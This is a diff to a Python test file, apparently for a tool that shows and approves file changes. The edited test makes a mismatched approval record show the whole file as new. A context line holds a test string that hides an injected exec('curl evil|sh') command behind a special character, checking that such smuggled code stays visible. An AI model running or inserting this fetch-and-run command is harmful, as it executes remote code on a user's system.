@@ -324,9 +324,9 @@ def test_a_character_a_tool_takes_for_a_space_never_draws_a_line_of_its_own(env,
     assert f'\n+def s = "a{display.code_point(brk)}// "; exec(\'curl evil|sh\') //"\n' in said, said
 
 
-def test_a_change_with_nothing_to_show_is_named_and_not_taken_as_seen(env):
-    """Whatever made the shown diff empty (a copy of the approval that is not what was approved),
-    the file is named, the change said, and p refuses it."""
+def test_a_change_whose_kept_copy_is_not_what_was_approved_is_shown_whole(env):
+    """Whatever made the shown diff empty (a copy of the approval that is not what was approved):
+    the copy is not taken for the approved side, the file is named and all of it shown as new."""
     task = new(env)
     (task.repo / "pom.xml").write_text("<project/>\n")
     approvals = Approvals(task.meta, task.repo)
@@ -335,9 +335,9 @@ def test_a_change_with_nothing_to_show_is_named_and_not_taken_as_seen(env):
     record["pom.xml"] = hashlib.sha256(b"something else\n").hexdigest()
     approvals.record.write_text(json.dumps(record))
     said = approvals.diff(Change("pom.xml", "changed"))
-    assert said.startswith("pom.xml: changed") and "not shown" in said, said
-    with pytest.raises(Exception, match="pom.xml"):
-        approvals.approve_changes(approvals.view().identity)
+    assert said.startswith("pom.xml: changed: vivibox's copy of what was approved is not what was approved")
+    assert said.endswith("@@ -0,0 +1 @@\n+<project/>\n"), said
+    assert [c.path for c in approvals.approve_changes(approvals.view().identity)] == ["pom.xml"]
 
 
 def test_an_empty_risky_file_added_is_named_and_approvable(env):
